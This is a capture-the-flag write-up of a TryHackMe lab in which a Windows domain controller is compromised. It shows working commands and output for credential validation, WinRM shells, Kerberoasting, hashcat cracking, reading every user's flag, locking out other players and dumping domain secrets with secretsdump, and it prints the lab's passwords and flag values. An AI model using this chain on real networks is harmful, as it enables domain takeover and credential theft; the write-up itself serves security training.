# Offline — King of the Domain (TryHackMe, King of the Hill)

> A Windows **Active Directory Domain Controller** compromise.
> Path: **web credential leak → low-priv WinRM shell → Kerberoasting → Domain Admin → full domain read → claim king.**

**Target:** `10.10.129.20`
**Domain:** `kingofthe.domain`
**Host:** `OFFLINE` (Windows Server 2012 R2, Domain Controller)
**Theme:** OfflineTV (usernames are streamers — scarra, pokimane, lilypichu, disguisedtoast, etc.)

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Initial Credential — Web Leak](#2-initial-credential--web-leak)
3. [Credential Validation](#3-credential-validation)
4. [Foothold — WinRM Shell](#4-foothold--winrm-shell)
5. [Enumeration](#5-enumeration)
6. [Privilege Escalation — Kerberoasting](#6-privilege-escalation--kerberoasting)
7. [Cracking the Ticket](#7-cracking-the-ticket)
8. [Domain Admin — Reading the Flags](#8-domain-admin--reading-the-flags)
9. [Claiming King (and the Encoding Gotcha)](#9-claiming-king-and-the-encoding-gotcha)
10. [Holding the Hill](#10-holding-the-hill)
11. [Lessons Learned](#11-lessons-learned)

---

## 1. Reconnaissance

Start with a service/version scan of the common ports:

```bash
sudo nmap -sS -sV -sC --top-ports 1000 -T4 10.10.129.20
```

| Flag | Meaning | Why |
|------|---------|-----|
| `-sS` | SYN "stealth" scan | Fast; half-open handshake |
| `-sV` | Version detection | Maps services to known exploits |
| `-sC` | Default NSE scripts | Free enumeration (banners, web titles, SMB info) |
| `--top-ports 1000` | Scan 1000 most common ports | Quick first pass |
| `-T4` | Timing template | Good speed/reliability balance |

**Key open ports:**

```
21/tcp    ftp           Microsoft ftpd
22/tcp    ssh           OpenSSH for Windows 8.1
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 8.5  (directory listing ENABLED)
88/tcp    kerberos-sec  <-- Domain Controller indicator
389/tcp   ldap          AD LDAP (Domain: kingofthe.domain)
445/tcp   microsoft-ds  SMB (Windows Server 2012 R2)
3389/tcp  ms-wbt-server RDP
5985/tcp  http          WinRM (remote PowerShell)
9999/tcp  http          IIS 8.5 (king server)
```

**Reading the results:** Ports **88 (Kerberos)**, **389 (LDAP)**, and **445 (SMB)** together say *Domain Controller*. That shifts the strategy from Linux-style local privesc to **Active Directory attacks** (Kerberos, SMB, domain privileges).

The IIS directory listing on port 80 also exposed a suspicious file:

```
http://10.10.129.20/Scarras_Super_Secret_Password.txt
```

---

## 2. Initial Credential — Web Leak

```bash
curl -s http://10.10.129.20/Scarras_Super_Secret_Password.txt
```

```
LeagueIsMyLove
```

- `curl` — command-line HTTP client
- `-s` — silent (no progress bar)

The filename points to user **scarra**, giving the first credential:

```
scarra : LeagueIsMyLove
```

> **Takeaway:** Always enumerate the web root. Directory listing + a file named "password" is an open door.

---

## 3. Credential Validation

Before launching a shell, confirm the credential works and learn what it unlocks:

```bash
crackmapexec winrm 10.10.129.20 -u scarra -p 'LeagueIsMyLove'
```

```
WINRM  10.10.129.20  5985  OFFLINE  [+] kingofthe.domain\scarra:LeagueIsMyLove (Pwn3d!)
```

- `crackmapexec` (CME) — tests credentials across SMB/WinRM/LDAP/etc.
- `(Pwn3d!)` — creds are valid **and** this account can get a WinRM shell.
  (A plain `[+]` would mean valid creds but no shell.)

---

## 4. Foothold — WinRM Shell

```bash
evil-winrm -i 10.10.129.20 -u scarra -p 'LeagueIsMyLove'
```

- `evil-winrm` — interactive PowerShell over WinRM (port 5985)
- `-i` — target IP

Result: a shell as `kingofthedomain\scarra`. No exploit required — WinRM is a legitimate admin feature we're borrowing with valid creds.

---

## 5. Enumeration

```powershell
whoami /groups     # group memberships
whoami /priv       # Windows privileges (keys to local privesc)
net user /domain   # list all domain users
```

`whoami /priv` showed **no** useful privileges (no `SeImpersonate`, `SeBackup`, etc.) — so **no local privesc shortcut**.

`net user /domain` revealed the user list, including a standout:

```
Administrator  fed      Guest   krbtgt  lily   mykull
poki           scarra   SVC_ROBOTARMY   toast  yvonne
```

**`SVC_ROBOTARMY`** — the `SVC_` prefix marks a **service account**, the prime target for **Kerberoasting**.

---

## 6. Privilege Escalation — Kerberoasting

### Concept
A service account with an **SPN** (Service Principal Name) can have a service ticket requested by *any* authenticated domain user. That ticket is **encrypted with the service account's password hash** — so we can request it, take it offline, and brute-force the password without touching the account or tripping lockouts.

### Request the ticket

```bash
impacket-GetUserSPNs kingofthe.domain/scarra:'LeagueIsMyLove' \
    -dc-ip 10.10.129.20 -request -outputfile spn.hash
```

- `impacket-GetUserSPNs` — finds SPN accounts and requests their tickets
- `domain/user:password` — authenticate as any valid domain user (scarra)
- `-dc-ip` — the Domain Controller to query
- `-request` — actually fetch the crackable ticket(s)
- `-outputfile spn.hash` — **write the hash straight to a file** (pasting it wraps lines and breaks hashcat)

Output — note the group membership:

```
ServicePrincipalName         Name           MemberOf
Offline/SVC_ROBOTARMY:11111  SVC_ROBOTARMY  CN=Domain Admins,CN=Users,DC=kingofthe,DC=domain
```

**`SVC_ROBOTARMY` is a Domain Admin.** Cracking its password = owning the domain.

---

## 7. Cracking the Ticket

```bash
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

- `hashcat` — password cracker
- `-m 13100` — hash mode for **Kerberos 5 TGS-REP (etype 23)**
- `rockyou.txt` — ~14M real leaked passwords

Cracked in **0 seconds**:

```
SVC_ROBOTARMY : robots
```

> The crack runs entirely on the attacker machine — invisible to the target, with unlimited attempts. This is why weak service-account passwords are so dangerous.

---

## 8. Domain Admin — Reading the Flags

```bash
evil-winrm -i 10.10.129.20 -u svc_robotarmy -p 'robots'
```

Now running as a **Domain Admin**. Read any user's files:

```powershell
type C:\Users\Administrator\flag.txt
```

Sweep every user flag in one loop:

```powershell
"Administrator","fed","lily","mykull","poki","scarra","toast","yvonne" |
    % { "--- $_ ---"; type "C:\Users\$_\flag.txt" }
```

- `|` — pipe the list into the next command
- `%` — alias for `ForEach-Object` (loop)
- `$_` — the current item (each username)

Actual output from the loop:

```
--- fed ---
THM{02592D82BBA02DE324F72496B393D16F}
--- lily ---
THM{89F288757F4D0693C99B007855FC075E}
--- mykull ---
THM{44EF79C7857DAFEC76F6E3F0F3263060}
--- poki ---
THM{1A44E1ED498294F9AA218F1742A160AA}
--- scarra ---
THM{C7914ACADABBCA1DE6287BD624953BA6}
--- toast ---
THM{4F2900F2FDFAF3F77BD599391218F49F}
--- yvonne ---
THM{7878847D55C22F58E3A702FC10D98C54}
```

Plus the Administrator flag:

```
C:\Users\Administrator\flag.txt → THM{95B20C5626EB94E68812FF93A6F8B7A0}
```

> **Publishing tip:** For a *public* writeup it's good etiquette to redact these (`THM{...}`) so readers still do the work. Keep the real values in your private notes. They're shown here because this is your personal reference copy.

---

## 9. Claiming King (and the Encoding Gotcha)

The king server (port **9999**) is an IIS site that serves whatever text is in its `king.txt`. Confirm the site and its path:

```powershell
Import-Module WebAdministration
Get-Website | Select-Object Name, ID, State, PhysicalPath
Get-WebBinding -Name "king" | Select-Object bindingInformation
```

```
Name  PhysicalPath
king  C:\Users\Administrator\king-server
bindingInformation: *:9999:
```

Becoming king = writing your name into that file.

### The mistake

```powershell
echo ARLICKTSHIWEWE > C:\Users\Administrator\king-server\king.txt
```

`curl http://10.10.129.20:9999/` returned **empty / binary**, and `Content-Length` was 34 for a 14-character name.

**Why:** PowerShell's `echo >` writes files in **UTF-16** (2 bytes/char + a BOM). Those null bytes make the web server serve unreadable "binary," and the scoring bot can't parse it.

### The fix

```powershell
[IO.File]::WriteAllText("C:\Users\Administrator\king-server\king.txt","ARLICKTSHIWEWE")
```

- `[IO.File]::WriteAllText` — .NET method that writes **plain ASCII/UTF-8, no BOM**

Verify from Kali:

```bash
curl -s http://10.10.129.20:9999/
# → ARLICKTSHIWEWE
```

**King claimed.** 👑

> **Real-world lesson:** text encoding matters. If a file *looks* right in `type`/`cat` but behaves wrong over the network, suspect UTF-16 vs UTF-8/ASCII.

### Why the privesc was necessary

Attempting the same write while still logged in as the **low-priv scarra** account fails:

```
[IO.File]::WriteAllText("C:\Users\Administrator\king-server\king.txt","ARLICKTSHIWEWE")
Exception calling "WriteAllText" ... "Access to the path ... is denied."
```

The file lives under `C:\Users\Administrator\`, which scarra cannot write to. Only after becoming **Domain Admin** (svc_robotarmy) does the write succeed. This is a clean demonstration of *why* Kerberoasting to DA was the required step — not just a flex.

---

## 10. Holding the Hill

As Domain Admin you can lock out other players (optional, for KotH scoring):

```powershell
# lock the king file so only your account can rewrite it
icacls C:\Users\Administrator\king-server\king.txt /inheritance:r /grant:r "SVC_ROBOTARMY:F"

# rotate the leaked / roastable credentials others used to get in
net user scarra <NewComplexPassword!>
```

Dump all domain secrets for persistence (pass-the-hash back in even after resets):

```bash
impacket-secretsdump kingofthe.domain/svc_robotarmy:'robots'@10.10.129.20
```

---

## 11. Lessons Learned

1. **Recon dictates strategy** — ports 88/389/445 = "this is a Domain Controller," which changes the entire approach.
2. **A credential is a foothold, not the goal** — one leaked password got us *in*, not *done*.
3. **In AD you abuse the protocol, not a software bug** — Kerberoasting is a feature working as designed.
4. **Service accounts are the weak link** — an SPN + a weak password + Domain Admin membership = instant domain compromise.
5. **Crack offline whenever possible** — invisible to the target, unlimited attempts.
6. **Domain Admin = read everything.**
7. **Encoding matters** — UTF-16 vs ASCII breaks web content, configs, and scripts constantly.

---

## Common Errors & Fixes (from this run)

| Symptom | Cause | Fix |
|---------|-------|-----|
| `crackmapexec: command not found` | Not installed | `sudo apt install crackmapexec` |
| hashcat `Salt-length exception / No hashes loaded` | Hash wrapped across lines on paste | Use `-outputfile spn.hash`; verify with `wc -l spn.hash` (must be 1) |
| `C:\...\flag.txt is not recognized as a cmdlet` | Ran a file path as a command in PowerShell | Prefix with `type` / `cat` / `Get-Content` |
| `whoami /group` invalid option | Wrong flag | It's `/groups` (plural) |
| King write `Access to the path is denied` | Writing as low-priv scarra | Must be Domain Admin (svc_robotarmy) |
| Port 9999 serves empty/binary | `echo >` wrote UTF-16 + BOM | `[IO.File]::WriteAllText(...)` for clean ASCII |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port/service reconnaissance |
| `curl` | HTTP requests / web enumeration |
| `crackmapexec` | Credential validation across protocols |
| `evil-winrm` | Interactive PowerShell over WinRM |
| `impacket-GetUserSPNs` | Kerberoasting (request SPN tickets) |
| `hashcat` | Offline password cracking |
| `impacket-secretsdump` | Dump domain credential material |

---

## Attack Chain Summary

```
nmap  ──►  directory-listing leak  ──►  scarra : LeagueIsMyLove
      │
      ▼
   WinRM shell (scarra, low-priv)
      │
      ▼
   Kerberoast SVC_ROBOTARMY  ──►  hashcat  ──►  robots
      │
      ▼
   Domain Admin  ──►  read all flags  ──►  claim king (port 9999)
```

*Authorized testing on a TryHackMe lab machine.*
